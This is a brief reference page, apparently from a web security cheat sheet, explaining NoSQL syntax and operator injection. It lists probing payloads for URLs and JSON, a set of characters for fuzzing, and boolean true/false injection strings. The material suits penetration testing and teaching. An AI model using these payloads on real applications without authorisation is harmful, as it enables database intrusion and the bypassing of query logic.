---
title: NoSQL Injection
description: Similar to SQL injection, but targeting databases that don't use traditional relational table structures.
---
Similar to SQL injection, NoSQL injection targets databases that don’t follow traditional relational table structures. If untrusted user input is directly included in a NoSQL query, an attacker may be able to modify the query's logic.

NoSQL injection affects NoSQL database such as MongoDB, Apache Cassandra.

There are two main types of NoSQL injection:

- **Syntax Injection**: Breaking out of the intended query structure to alter its behaviour.
- **Operator Injection**: Injecting NoSQL-specific operators (e.g., `$ne`, `$gt`) to manipulate query results or bypass conditions.

## Exploit
### Syntax Injection
**Testing how the application parses and handle unexpected input**

Injecting in the url:
```
'"`{ ;$Foo} $Foo \xYZ
```

Injecting in json:
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

Fuzzing individual characters
```
'
"
\
{
}
[
]
:
,
$
.
;
(
)

```

**Testing conditional behaviour**

False condition
```
' && 0 && 'x
```

True condition
```
' && 1 && 'x
```
